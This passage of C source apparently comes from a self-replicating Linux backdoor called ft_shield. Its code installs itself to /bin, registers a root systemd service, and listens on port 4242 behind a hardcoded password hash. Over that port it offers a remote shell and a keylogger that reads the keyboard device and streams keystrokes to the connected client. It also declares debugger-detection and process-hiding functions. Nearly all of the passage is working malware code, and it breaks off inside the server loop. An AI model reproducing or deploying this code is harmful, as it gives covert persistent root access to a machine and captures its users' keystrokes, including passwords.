	t_list *aux = lst;

	if (aux == NULL)
		return (NULL);
	while (aux->next != NULL)
		aux = aux->next;
	return (aux);
}

void	ft_lstadd_back(t_list **lst, t_list *new_node)
{
	if (new_node == NULL)
		return ;
	if (*lst == NULL)
	{
		*lst = new_node;
		return ;
	}
	ft_lstlast(*lst)->next = new_node;
}

bool shell_was_closed(t_list *node)
{
	pid_t pid_shell = (int)(long)node->content;

	int status;
	int res_wait = waitpid(pid_shell, &status, WNOHANG);
	if (pid_shell)
		ft_dprintf(2, "active shell: %d res wait %d\n", pid_shell, res_wait);
	if (res_wait == pid_shell)
	{
		ft_dprintf(2, "process %d has finished\n", res_wait);
		return (true);
	}
	return (false);
}

void ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *))
{
	t_list *current = *lst;
	t_list *prev = NULL;
	t_list *next;

	while (current != NULL)
	{
		next = current->next;
		if (f(current) == true)
		{
			ft_dprintf(2, "deleting node with content %ld\n", (long)current->content);
			//server->nbr_clients--;
			ft_dprintf(2, "there are %d connections\n", server->nbr_clients);
			if (prev == NULL)
				*lst = next;
			else
				prev->next = next;
			free(current);
		}
		else
			prev = current;
		current = next;
	}
}

void	ft_lstdelone(t_list *lst, void (*del)(void *))
{
	if (del != NULL)
		(*del)(lst->content);
	free(lst);
}

void	ft_lstclear(t_list **lst, void (*del)(void *))
{
	t_list	*tmp;

	while (lst && *lst)
	{
		tmp = (*lst)->next;
		ft_lstdelone(*lst, del);
		*lst = tmp;
	}
}


/* FIND_EXEC_PATH.C */
int	find_own_path(char *buffer, size_t size_buffer)
{
	const char *paths[] = {
		"/proc/self/exe",        // Linux
		"/proc/curproc/file",    // FreeBSD
        "/proc/self/path/a.out", // Solaris
        "/proc/curproc/exe",     // NetBSD
        NULL
    };

	for (int i = 0; paths[i]; ++i)
	{
		int readed = readlink(paths[i], buffer, size_buffer);
		if (readed != -1)
		{
			ft_dprintf(2, "readlink: [%s]\n", buffer);
			return (i);
		}
	}
	return (-1);
}


/* MAIN.C */
char path[PATH_MAX] = {0};
char dir_name[PATH_MAX] = {0};

bool	find_dir(char *dirname)
{
	char	*exec_paths = getenv("PATH");
	char	*location = ft_strnstr(exec_paths, dirname, -1);

	if (location != NULL) {
		ft_dprintf(2, "found [%s]\n", location);
		return (true);
	}
	return (false);
}

bool	need_to_install_server(void)
{
	if (find_own_path(path, sizeof(path)) == -1) {
		ft_dprintf(2, "can't find own executable\n");
		exit(1);
	}

	memmove(dir_name, path, sizeof(path));
	dirname(dir_name);
	ft_dprintf(2, "dir_name: [%s]\n", dir_name);
	if (find_dir(dir_name) == true) {
		ft_dprintf(2, "We are already in the infected path: [%s]\n", dir_name);
		return (false);
	}
	ft_dprintf(2, "we need to install the server: [%s]\n", path);
	return (true);
}

void	compact_binary(void)
{
	char compact_cmd[PATH_MAX] = {0};
	char *filename = strdup(path);

	ft_dprintf(2, "binary: %s\n", filename);
	sprintf(compact_cmd, "cp %s %s.tmp; strip --strip-all %s.tmp; mv %s.tmp %s", filename, filename, filename, filename, filename);
	ft_dprintf(2, "cmd: %s\n", compact_cmd);
	free(filename);

	system(compact_cmd);

	char	*argv[] = {
		path, "--compacted", NULL
	};

	ft_dprintf(2, "binary compacted\n");
	ft_dprintf(2, "----------------\n");
	execv(path, argv);
	exit(1);
}

#define TEMP_SHIELD "/tmp/ft_shield.c"
#define DEST_PATH "/bin/ft_shield"

void	quine(void)
{
	char *source_code = "/* FT_SHIELD.H */\n"
"# ifndef DEBUG\n"
"#  define ENABLE\n"
"# endif\n"
"\n"
"# include <fcntl.h>\n"
"# include <libgen.h>\n"
"# include <limits.h>\n"
"# include <stdbool.h>\n"
"# include <stdio.h>\n"
"# include <stdlib.h>\n"
"# include <string.h>\n"
"# include <errno.h>\n"
"# include <unistd.h>\n"
"# include <arpa/inet.h>\n"
"// # include <bsd/string.h>\n"
"# include <linux/limits.h>\n"
"# include <sys/types.h>\n"
"# include <sys/socket.h>\n"
"# include <sys/select.h>\n"
"# include <sys/un.h>\n"
"# include <sys/wait.h>\n"
"# include <sys/ioctl.h>\n"
"# include <linux/input.h>\n"
"# include <sys/stat.h>\n"
"# include <dirent.h>\n"
"\n"
"#define DEST_PATH \"/bin/ft_shield\"\n"
"#define DEV_PATH \"/dev/input\"\n"
"#define MAX_EVENTS 3\n"
"#define KEY_PRESSED 1\n"
"#define KEY_RELEASED 0\n"
"#define KEY_REPEATED 2\n"
"#define DEST_SERVICE \"/etc/systemd/system/ft_shield.service\"\n"
"#define LISTENING_PORT 4242\n"
"#define MAX_CONECTIONS 32 //because pipes may need more fds...\n"
"#define MAX_NBR_CLIENTS 2\n"
"#define READ_END 0\n"
"#define WRITE_END 1\n"
"\n"
"#define TRIM_CHARS \"\\f\\n\\r\\t\\v \"\n"
"\n"
"#define HELP \"\\\n"
"---------------------------------\\n\\\n"
"?      - Shows help\\n\\\n"
"clear  - Clear terminal\\n\\\n"
"logon  - Spawns a keylogger in port 4242\\n\\\n"
"shell  - Spawn shell in port 4242\\n\\\n"
"nstats - Shows network stats\\n\\\n"
"---------------------------------\\n\\\n"
"\"\n"
"#define REMOTE_OPENED \"New remote shell opened in port 4242\\n\"\n"
"#define MANY_CLIENTS \"Connection denied, too many clients\\n\"\n"
"#define CLEAR_CODE \"\\033[H\\033[2J\"\n"
"\n"
"#define SERVICE \"\\\n"
"[Unit]\\n\\\n"
"Description=ft_shield service\\n\\\n"
"After=network.target\\n\\\n"
"\\n\\\n"
"[Service]\\n\\\n"
"Type=simple\\n\\\n"
"ExecStart=/bin/ft_shield\\n\\\n"
"Restart=always\\n\\\n"
"RestartSec=5\\n\\\n"
"User=root\\n\\\n"
"\\n\\\n"
"[Install]\\n\\\n"
"WantedBy=multi-user.target\\n\\\n"
"\"\n"
"\n"
"typedef struct s_list t_list;\n"
"typedef struct input_event t_event;\n"
"\n"
"typedef enum e_status {\n"
"	HANDSHAKE,\n"
"	CONNECTED,\n"
"	SHELL,\n"
"	KEYLOGGER\n"
"} t_status;\n"
"\n"
"typedef struct s_client {\n"
"	int			fd;\n"
"	t_status	status;\n"
"	char		*shell_code;\n"
"	char		*response_bffr;\n"
"	char		disconnect;\n"
"	size_t		inbytes; //client input bytes\n"
"	size_t		outbytes; //client output bytes\n"
"	int			inpipe_fd;\n"
"	int			outpipe_fd;\n"
"}	t_client;\n"
"\n"
"typedef struct s_server {\n"
"	int			fd;\n"
"	int			nbr_clients;\n"
"	t_list		*pids;\n"
"	t_list		*passwords;\n"
"	t_client	clients[MAX_CONECTIONS];\n"
"	size_t		total_outbytes;\n"
"	size_t		total_inbytes;\n"
"	fd_set		rfds;\n"
"	fd_set		wfds;\n"
"}	t_server;\n"
"\n"
"int		handle_input(t_server *server, int index, char *buffer);\n"
"void	handle_handshake(t_server *server, int index, char *input);\n"
"int		handle_commands(t_server *server, int index, char *input);\n"
"void	delete_client(t_server *server, int index);\n"
"int		extract_outpipe(t_server *server, int index);\n"
"\n"
"/* shell.c */\n"
"// void	*shell_function(void *data);\n"
"int	shell_function(t_server *server, int index);\n"
"\n"
"/* keylogger.c */\n"
"int	keylogger_function(t_server *server, int index);\n"
"\n"
"/* keylogger_utils.c */\n"
"int hasEventTypes(int fd, unsigned long evbit_to_check);\n"
"int hasKeys(int fd);\n"
"int hasRelativeMovement(int fd);\n"
"int hasAbsoluteMovement(int fd);\n"
"int hasSpecificKeys(int fd, int *keys, size_t num_keys);\n"
"int keyboardFound(char *path, int *keyboard_fd);\n"
"\n"
"/* stealth.c */\n"
"int	is_valgrind_running();\n"
"int	is_debugger_attached();\n"
"\n"
"/* service.c */\n"
"void	create_service(void);\n"
"void	start_service(void);\n"
"\n"
"/* server.c */\n"
"void	create_server_socket(t_server *s);\n"
"void	ft_server(t_server *server);\n"
"\n"
"int	find_own_path(char *buffer, size_t size_buffer);\n"
"\n"
"/* utils/utils.c */\n"
"char	*ft_strnstr(const char *haystack, const char *needle, size_t len);\n"
"char	*ft_strtrim(char const *s1, char const *set);\n"
"void	simple_deterministic_id(const uint8_t *input_data, size_t input_len, char *output);\n"
"char	*gen_random_password(void);\n"
"\n"
"void	ft_dprintf(int fd, const char *format, ...);\n"
"void	ft_perror(char *str);\n"
"\n"
"char	*ft_strdup(const char *s1);\n"
"void	add2buffer(t_client *client, char *str);\n"
"\n"
"typedef struct s_list\n"
"{\n"
"	void			*content;\n"
"	struct s_list	*next;\n"
"}	t_list;\n"
"\n"
"t_list	*ft_lstnew(void *content);\n"
"t_list	*ft_lstlast(t_list *lst);\n"
"void	ft_lstadd_back(t_list **lst, t_list *new_node);\n"
"bool	shell_was_closed(t_list *node);\n"
"void	ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *));\n"
"void	ft_lstdelone(t_list *lst, void (*del)(void *));\n"
"void	ft_lstclear(t_list **lst, void (*del)(void *));\n"
"void	hide_process_name(char **argv);\n"
"\n"
"/*--------------------------------------*/\n"
"\n"
"/* KEYLOGER_UTILS.C */\n"
"int hasEventTypes(int fd, unsigned long evbit_to_check)\n"
"{\n"
"	unsigned long evbit = 0;\n"
"\n"
"	ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);\n"
"\n"
"	return ((evbit & evbit_to_check) == evbit_to_check);\n"
"}\n"
"\n"
"int hasKeys(int fd)\n"
"{\n"
"	return hasEventTypes(fd, (1 << EV_KEY));\n"
"}\n"
"\n"
"int hasRelativeMovement(int fd)\n"
"{\n"
"	return hasEventTypes(fd, (1 << EV_REL));\n"
"}\n"
"\n"
"int hasAbsoluteMovement(int fd)\n"
"{\n"
"	return hasEventTypes(fd, (1 << EV_ABS));\n"
"}\n"
"\n"
"int hasSpecificKeys(int fd, int *keys, size_t num_keys)\n"
"{\n"
"\n"
"	size_t nchar = KEY_MAX / 8 + 1;\n"
"	unsigned char bits[nchar];\n"
"\n"
"	ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);\n"
"\n"
"	for (size_t i = 0; i < num_keys; ++i)\n"
"	{\n"
"		int key = keys[i];\n"
"		if (!(bits[key / 8] & (1 << (key % 8))))\n"
"			return 0;\n"
"	}\n"
"	return 1;\n"
"}\n"
"\n"
"int keyboardFound(char *path, int *keyboard_fd)\n"
"{\n"
"	DIR *dir = opendir(path);\n"
"	if (dir == NULL)\n"
"		return 0;\n"
"\n"
"	struct dirent *entry;\n"
"	while ((entry = readdir(dir)) != NULL)\n"
"	{\n"
"		if (strcmp(entry->d_name, \".\") == 0 || strcmp(entry->d_name, \"..\") == 0)\n"
"			continue;\n"
"\n"
"		char filepath[320];\n"
"		snprintf(filepath, sizeof(filepath), \"%s/%s\", path, entry->d_name);\n"
"		struct stat file_stat;\n"
"		if (stat(filepath, &file_stat) == -1)\n"
"		{\n"
"			ft_perror(\"Error getting file information\");\n"
"			continue;\n"
"		}\n"
"\n"
"		if (S_ISDIR(file_stat.st_mode))\n"
"		{\n"
"			if (keyboardFound(filepath, keyboard_fd))\n"
"			{\n"
"				closedir(dir);\n"
"				return 1;\n"
"			}\n"
"		}\n"
"		else\n"
"		{\n"
"			int fd = open(filepath, O_RDONLY);\n"
"			int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};\n"
"			if (!hasRelativeMovement(fd) && !hasAbsoluteMovement(fd) && hasKeys(fd) && hasSpecificKeys(fd, keys_to_check, 12))\n"
"			{\n"
"				printf(\"Keyboard found! File: \\\"%s\\\"\\n\", filepath);\n"
"				closedir(dir);\n"
"				*keyboard_fd = fd;\n"
"				return 1;\n"
"			}\n"
"			close(fd);\n"
"		}\n"
"	}\n"
"\n"
"	closedir(dir);\n"
"	return 0;\n"
"}\n"
"\n"
"\n"
"/* KEYLOGER.C */\n"
"#include <linux/input.h>\n"
"#include <dirent.h>\n"
"#include <ctype.h>\n"
"#include <sys/ioctl.h>\n"
"\n"
"char *keycodes[247] = {\"RESERVED\", \"ESC\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"0\", \"MINUS\", \"EQUAL\", \"BACKSPACE\", \"TAB\", \"Q\", \"W\", \"E\", \"R\", \"T\", \"Y\", \"U\", \"I\", \"O\", \"P\", \"LEFTBRACE\", \"RIGHTBRACE\", \"ENTER\", \"LEFTCTRL\", \"A\", \"S\", \"D\", \"F\", \"G\", \"H\", \"J\", \"K\", \"L\", \"SEMICOLON\", \"APOSTROPHE\", \"GRAVE\", \"LEFTSHIFT\", \"BACKSLASH\", \"Z\", \"X\", \"C\", \"V\", \"B\", \"N\", \"M\", \"COMMA\", \"DOT\", \"SLASH\", \"RIGHTSHIFT\", \"KPASTERISK\", \"LEFTALT\", \"SPACE\", \"CAPSLOCK\", \"F1\", \"F2\", \"F3\", \"F4\", \"F5\", \"F6\", \"F7\", \"F8\", \"F9\", \"F10\", \"NUMLOCK\", \"SCROLLLOCK\", \"KP7\", \"KP8\", \"KP9\", \"KPMINUS\", \"KP4\", \"KP5\", \"KP6\", \"KPPLUS\", \"KP1\", \"KP2\", \"KP3\", \"KP0\", \"KPDOT\", \"ZENKAKUHANKAKU\", \"102ND\", \"F11\", \"F12\", \"RO\", \"KATAKANA\", \"HIRAGANA\", \"HENKAN\", \"KATAKANAHIRAGANA\", \"MUHENKAN\", \"KPJPCOMMA\", \"KPENTER\", \"RIGHTCTRL\", \"KPSLASH\", \"SYSRQ\", \"RIGHTALT\", \"LINEFEED\", \"HOME\", \"UP\", \"PAGEUP\", \"LEFT\", \"RIGHT\", \"END\", \"DOWN\", \"PAGEDOWN\", \"INSERT\", \"DELETE\", \"MACRO\", \"MUTE\", \"VOLUMEDOWN\", \"VOLUMEUP\", \"POWER\", \"KPEQUAL\", \"KPPLUSMINUS\", \"PAUSE\", \"SCALE\", \"KPCOMMA\", \"HANGEUL\", \"HANGUEL\", \"HANJA\", \"YEN\", \"LEFTMETA\", \"RIGHTMETA\",\n"
"                       \"COMPOSE\", \"STOP\", \"AGAIN\", \"PROPS\", \"UNDO\", \"FRONT\", \"COPY\", \"OPEN\", \"PASTE\", \"FIND\", \"CUT\", \"HELP\", \"MENU\", \"CALC\", \"SETUP\", \"SLEEP\", \"WAKEUP\", \"FILE\", \"SENDFILE\", \"DELETEFILE\", \"XFER\", \"PROG1\", \"PROG2\", \"WWW\", \"MSDOS\", \"COFFEE\", \"SCREENLOCK\", \"ROTATE_DISPLAY\",\n"
"                       \"DIRECTION\", \"CYCLEWINDOWS\", \"MAIL\", \"BOOKMARKS\", \"COMPUTER\", \"BACK\", \"FORWARD\", \"CLOSECD\", \"EJECTCD\", \"EJECTCLOSECD\", \"NEXTSONG\", \"PLAYPAUSE\", \"PREVIOUSSONG\", \"STOPCD\", \"RECORD\", \"REWIND\", \"PHONE\", \"ISO\", \"CONFIG\", \"HOMEPAGE\", \"REFRESH\", \"EXIT\", \"MOVE\", \"EDIT\", \"SCROLLUP\", \"SCROLLDOWN\", \"KPLEFTPAREN\", \"KPRIGHTPAREN\", \"NEW\", \"REDO\", \"F13\", \"F14\", \"F15\", \"F16\", \"F17\", \"F18\", \"F19\", \"F20\", \"F21\", \"F22\", \"F23\", \"F24\", \"PLAYCD\", \"PAUSECD\", \"PROG3\", \"PROG4\", \"ALL_APPLICATIONS\", \"DASHBOARD\", \"SUSPEND\", \"CLOSE\", \"PLAY\", \"FASTFORWARD\", \"BASSBOOST\", \"PRINT\", \"HP\", \"CAMERA\", \"SOUND\", \"QUESTION\", \"EMAIL\", \"CHAT\", \"SEARCH\", \"CONNECT\", \"FINANCE\", \"SPORT\", \"SHOP\", \"ALTERASE\", \"CANCEL\", \"BRIGHTNESSDOWN\", \"BRIGHTNESSUP\", \"MEDIA\", \"SWITCHVIDEOMODE\", \"KBDILLUMTOGGLE\", \"KBDILLUMDOWN\", \"KBDILLUMUP\", \"SEND\", \"REPLY\", \"FORWARDMAIL\", \"SAVE\", \"DOCUMENTS\", \"BATTERY\", \"BLUETOOTH\", \"WLAN\", \"UWB\", \"UNKNOWN\", \"VIDEO_NEXT\", \"VIDEO_PREV\", \"BRIGHTNESS_CYCLE\", \"BRIGHTNESS_AUTO\", \"BRIGHTNESS_ZERO\", \"DISPLAY_OFF\", \"WWAN\", \"WIMAX\"};\n"
"size_t event_size = sizeof(t_event);\n"
"\n"
"\n"
"#define KLG_HELP \"Available commands:\\n\\\n"
"help: print this help\\n\\\n"
"exit: close keylogger\\n\"\n"
"\n"
"static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)\n"
"{\n"
"	int written;\n"
"	char str[256] = {0};\n"
"	for (size_t j = 0; j < to_write / event_size; j++)\n"
"		snprintf(str, 255, \"Key: %s\\n\", keycodes[events[j].code]);\n"
"	written = write(fd, str, strlen(str));\n"
"	if (written < 0)\n"
"		return written;\n"
"	return 1;\n"
"}\n"
"\n"
"void handle_klg_cmd(char *bfr) {\n"
"	if (!strncmp(\"help\\n\", bfr, strlen(bfr))) {\n"
"		printf(KLG_HELP);\n"
"	}\n"
"	if (!strncmp(\"exit\\n\", bfr, strlen(bfr))) {\n"
"		exit(0);\n"
"	}\n"
"}\n"
"\n"
"int	keylogger_function(t_server *server, int index)\n"
"{\n"
"	const int	client_fd = server->clients[index].fd;\n"
"	pid_t		pid;\n"
"	int			inpipe_fds[2], outpipe_fds[2];\n"
"\n"
"	ft_dprintf(2, \"clientfd: %d\\n\", client_fd);\n"
"\n"
"\n"
"	pipe(inpipe_fds);\n"
"	pipe(outpipe_fds);\n"
"	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin\n"
"	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here\n"
"\n"
"	pid = fork();\n"
"	if (pid < 0) {\n"
"		ft_perror(\"fork\");\n"
"	}\n"
"	else if (pid == 0) {\n"
"		setsid();\n"
"\n"
"		close(server->fd);\n"
"		close(inpipe_fds[WRITE_END]);\n"
"		close(outpipe_fds[READ_END]);\n"
"		dup2(inpipe_fds[READ_END], STDIN_FILENO);\n"
"		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);\n"
"		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);\n"
"		close(inpipe_fds[READ_END]);\n"
"		close(outpipe_fds[WRITE_END]);\n"
"		close(client_fd);\n"
"		int	kb;\n"
"		if (!keyboardFound(DEV_PATH, &kb)) {\n"
"			printf(\"couldn't open keyboard :(\\n\");\n"
"			exit(1);\n"
"		}\n"
"\n"
"		t_event kbd_events[event_size * MAX_EVENTS];\n"
"		fd_set rset;\n"
"		\n"
"		int maxfd = kb;\n"
"\n"
"		while (1)\n"
"		{\n"
"			fflush(stdout);\n"
"			FD_SET(STDIN_FILENO, &rset);\n"
"			FD_SET(kb, &rset);\n"
"			struct timeval tv = {.tv_sec = 0, .tv_usec = 5000};\n"
"			int retval = select(maxfd + 1, &rset, NULL, NULL, &tv);\n"
"			if (retval == -1) { ft_perror(\"select\"); break; }\n"
"			if (FD_ISSET(kb, &rset)) {\n"
"				int r = read(kb, kbd_events, event_size * MAX_EVENTS);\n"
"				if (r < 0)\n"
"					break ;\n"
"				else\n"
"				{\n"
"					size_t j = 0;\n"
"					for (size_t i = 0; i < r / event_size; i++) //for each event read\n"
"					{\n"
"						if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..\n"
"							kbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array\n"
"					}\n"
"					if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)\n"
"						break ;\n"
"				}\n"
"			}\n"
"			if (FD_ISSET(STDIN_FILENO, &rset)) {\n"
"				char buffer[256];\n"
"				int r = read(STDIN_FILENO, buffer, 255);\n"
"				if (r <= 0)\n"
"					break ;\n"
"				buffer[r] = 0;\n"
"				handle_klg_cmd(buffer);\n"
"			}\n"
"		}\n"
"		close(STDOUT_FILENO);\n"
"		close(kb);\n"
"		exit(0);\n"
"	}\n"
"	else if (pid > 0) {\n"
"		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));\n"
"		close(inpipe_fds[READ_END]);\n"
"		close(outpipe_fds[WRITE_END]);\n"
"	}\n"
"	return (1);\n"
"}\n"
"\n"
"\n"
"/* HANDLERS.C */\n"
"bool	search_password(t_server *server, char *input)\n"
"{\n"
"	t_list	*lst = server->passwords;\n"
"	t_list	*prev = NULL;\n"
"\n"
"	while (lst)\n"
"	{\n"
"		if (strcmp(lst->content, input) == 0)\n"
"		{\n"
"			if (prev == NULL)\n"
"				server->passwords = lst->next;\n"
"			else\n"
"				prev->next = lst->next;\n"
"			ft_dprintf(2, \"password [%s] found and deleted\\n\", input);\n"
"			free(lst->content);\n"
"			free(lst);\n"
"			return (true);\n"
"		}\n"
"		prev = lst;\n"
"		lst = lst->next;\n"
"	}\n"
"	return (false);\n"
"}\n"
"\n"
"bool	check_server_password(t_server *server, char *input)\n"
"{\n"
"	const char	*server_pass = \"E4F47C78F4E89C24DC38907008A4284C\";\n"
"	char		input_hash[33];\n"
"\n"
"	(void)server;\n"
"	simple_deterministic_id((uint8_t *)input, strlen(input), input_hash);\n"
"	ft_dprintf(2, \"input: [%s] hash: [%s]\\n\", input, input_hash);\n"
"	if (strcmp(server_pass, input_hash) == 0)\n"
"	{\n"
"		ft_dprintf(2, \"password match\\n\");\n"
"		return (true);\n"
"	}\n"
"	return (false);\n"
"}\n"
"\n"
"void	handle_handshake(t_server *server, int index, char *input) {\n"
"	t_client *const	client = &server->clients[index];\n"
"\n"
"	if (client->status == HANDSHAKE)\n"
"	{\n"
"		ft_dprintf(2, \"HANDSHAKE INPUT [%s]\\n\", input);\n"
"		if (search_password(server, input) == true)\n"
"		{\n"
"			shell_function(server, index);\n"
"			client->status = SHELL;\n"
"			return ;\n"
"		}\n"
"		if (check_server_password(server, input) == false)\n"
"		{\n"
"			ft_dprintf(2, \"Invalid KEY\\n\");\n"
"			return ;\n"
"		}\n"
"		ft_dprintf(2, \"Valid KEY\\n\");\n"
"		client->status = CONNECTED;\n"
"		add2buffer(&server->clients[index], strdup(\"$> \"));\n"
"	}\n"
"}\n"
"\n"
"void	add_password(t_server *server, int index)\n"
"{\n"
"	char		*password = gen_random_password();\n"
"	t_list		*new_node = ft_lstnew(password);\n"
"	char		msg_connection[300] = {0};\n"
"\n"
"	ft_lstadd_back(&server->passwords, new_node);\n"
"	sprintf(msg_connection, \"To access the remote shell, use the next Keycode -> [%s]\\n\", password);\n"
"	add2buffer(&server->clients[index], strdup(msg_connection));\n"
"}\n"
"\n"
"void	delete_client(t_server *server, int index)\n"
"{\n"
"	t_client *client = &server->clients[index];\n"
"\n"
"	close(client->fd);\n"
"	if (client->inpipe_fd && client->outpipe_fd) {\n"
"		close(client->inpipe_fd);\n"
"		close(client->outpipe_fd);\n"
"	}\n"
"	memset(&server->clients[index], 0, sizeof(t_client));\n"
"	server->nbr_clients--;\n"
"}\n"
"\n"
"void	nstats(t_server *s, int index)\n"
"{\n"
"	char		msg[300] = {0};\n"
"\n"
"	sprintf(msg, \"Total inbytes: %ld\\nTotal outbytes: %ld\\nSession inbytes: %ld\\nSession outbytes: %ld\\n\\n\",\n"
"		s->total_inbytes, s->total_outbytes, s->clients[index].inbytes, s->clients[index].outbytes );\n"
"	add2buffer(&s->clients[index], strdup(msg));\n"
"}\n"
"\n"
"int	handle_commands(t_server *server, int index, char *input)\n"
"{\n"
"	t_client	*client = &server->clients[index];\n"
"\n"
"	if (strcmp(\"clear\", input) == 0)\n"
"	{\n"
"		add2buffer(&server->clients[index], strdup(CLEAR_CODE));\n"
"	}\n"
"	else if (strcmp(\"shell\", input) == 0)\n"
"	{\n"
"		ft_dprintf(2, \"client_fd: %d\\n\", client->fd);\n"
"		add_password(server, index);\n"
"		client->disconnect = true;\n"
"		//delete_client(server, index);\n"
"	}\n"
"	else if (strcmp(\"logon\", input) == 0)\n"
"	{\n"
"		client->status = KEYLOGGER;\n"
"		keylogger_function(server, index);\n"
"		return (0);\n"
"	}\n"
"	else if (strcmp(\"nstats\", input) == 0)\n"
"	{\n"
"		nstats(server, index);\n"
"	}\n"
"	else if (strcmp(\"?\", input) == 0 || strcmp(\"help\", input) == 0)\n"
"	{\n"
"		add2buffer(&server->clients[index], strdup(HELP));\n"
"	}\n"
"	add2buffer(client, strdup(\"$> \"));\n"
"	return (0);\n"
"}\n"
"\n"
"int	handle_inpipe(t_server *server, int index, char *input)\n"
"{\n"
"	t_client	*client = &server->clients[index];\n"
"	//printf(\"trying to write inpipe, fdisset %i\\n\", FD_ISSET(client->inpipe_fd, &server->wfds));\n"
"	if (client->inpipe_fd && FD_ISSET(client->inpipe_fd, &server->wfds))\n"
"	{\n"
"		//printf(\"writing inpipe!\\n\");\n"
"		int r = write(client->inpipe_fd, input, strlen(input));\n"
"		if (r < 0) {\n"
"			close(client->inpipe_fd);\n"
"			client->inpipe_fd = 0;\n"
"			close(client->outpipe_fd);\n"
"			client->outpipe_fd = 0;\n"
"			client->status = CONNECTED;\n"
"			client->response_bffr = strdup(\"$> \");\n"
"		}\n"
"	}\n"
"	return 0;\n"
"}\n"
"\n"
"int	extract_outpipe(t_server *server, int index)\n"
"{\n"
"	char buffer[4096];\n"
"\n"
"	memset(buffer, 0, sizeof(buffer));\n"
"	int			r = 0;\n"
"	t_client	*client = &server->clients[index];\n"
"	//printf(\"trying to read outpipe %i, fdisset %i\\n\", client->outpipe_fd, FD_ISSET(client->outpipe_fd, &server->rfds));\n"
"	if (client->outpipe_fd && FD_ISSET(client->outpipe_fd, &server->rfds))\n"
"	{\n"
"		r = read(client->outpipe_fd, buffer, 4095);\n"
"		//printf(\"reading outpipe! (bytes: %i)\\n\", r);\n"
"		if (r == 0) {\n"
"			close(client->inpipe_fd);\n"
"			client->inpipe_fd = 0;\n"
"			close(client->outpipe_fd);\n"
"			client->outpipe_fd = 0;\n"
"			client->status = CONNECTED;\n"
"			client->response_bffr = strdup(\"$> \");\n"
"		}\n"
"		if (r > 0)\n"
"		{\n"
"			client->response_bffr = calloc(r + 1, 1);\n"
"			memcpy(client->response_bffr, buffer, r);\n"
"		}\n"
"		if (r < 0)\n"
"			client->response_bffr = strdup(\"errooooor\\n\");\n"
"	}\n"
"	return r;\n"
"}\n"
"\n"
"int	handle_input(t_server *server, int index, char *buffer)\n"
"{\n"
"	const t_client	*client = &server->clients[index];\n"
"	char			*input = ft_strtrim(buffer, TRIM_CHARS);\n"
"	int				fd;\n"
"\n"
"	ft_dprintf(2, \"readed: [%s]\\n\", input);\n"
"	if (client->status == HANDSHAKE)\n"
"		handle_handshake(server, index, input);\n"
"	else if (client->status == CONNECTED)\n"
"		fd = handle_commands(server, index, input);\n"
"	else if (client->status == SHELL || client->status == KEYLOGGER)\n"
"		fd = handle_inpipe(server, index, buffer);\n"
"	free(input);\n"
"	return (fd);\n"
"}\n"
"\n"
"\n"
"/* SERVER.C */\n"
"void	create_server_socket(t_server *server)\n"
"{\n"
"	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);\n"
"	if (socket_fd == -1)\n"
"	{\n"
"		ft_perror(\"socket\");\n"
"		exit(EXIT_FAILURE);\n"
"	}\n"
"\n"
"	int reuse = 1;\n"
"	if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse, sizeof(reuse)) < 0)\n"
"	{\n"
"		ft_perror(\"setsockopt(SO_REUSEADDR)\");\n"
"		exit(EXIT_FAILURE);\n"
"	}\n"
"\n"
"	struct sockaddr_in server_addr;\n"
"\n"
"	memset(&server_addr, 0, sizeof(server_addr));\n"
"	server_addr.sin_family = AF_INET;\n"
"	server_addr.sin_port = htons(LISTENING_PORT);\n"
"	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);\n"
"\n"
"	if (bind(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)\n"
"	{\n"
"		ft_perror(\"bind\");\n"
"		exit(EXIT_FAILURE);\n"
"	}\n"
"\n"
"	if (listen(socket_fd, MAX_CONECTIONS) == -1)\n"
"	{\n"
"		ft_perror(\"listen\");\n"
"		exit(EXIT_FAILURE);\n"
"	}\n"
"	server->fd = socket_fd;\n"
"}\n"
"\n"
"\n"
"int	set_rw_fdset(t_client *clients, fd_set *rset, fd_set *wset, int server_fd)\n"
"{\n"
"	FD_ZERO(rset);\n"
"	FD_ZERO(wset);\n"
"	FD_SET(server_fd, rset);\n"
"\n"
"	int max_fd = server_fd;\n"
"	for (int fd = 0; fd < MAX_CONECTIONS; ++fd)\n"
"	{\n"
"		if (clients[fd].fd)\n"
"		{\n"
"			FD_SET(clients[fd].fd, rset);\n"
"			FD_SET(clients[fd].fd, wset);\n"
"			if (clients[fd].fd > max_fd)\n"
"				max_fd = clients[fd].fd;\n"
"			if (clients[fd].inpipe_fd && clients[fd].outpipe_fd)\n"
"			{\n"
"				FD_SET(clients[fd].inpipe_fd, wset);\n"
"				FD_SET(clients[fd].outpipe_fd, rset);\n"
"				if (clients[fd].inpipe_fd > max_fd)\n"
"					max_fd = clients[fd].inpipe_fd;\n"
"				if (clients[fd].outpipe_fd > max_fd)\n"
"					max_fd = clients[fd].outpipe_fd;\n"
"			}\n"
"		}\n"
"	}\n"
"	return (max_fd);\n"
"}\n"
"\n"
"void server_loop(t_server *s)\n"
"{\n"
"	t_client			*clients = s->clients;\n"
"	\n"
"	struct sockaddr_in	address;\n"
"	int					addrlen = sizeof(address);\n"
"\n"
"	while (1)\n"
"	{\n"
"		struct timeval tv = {.tv_sec = 1, .tv_usec = 0};\n"
"		\n"
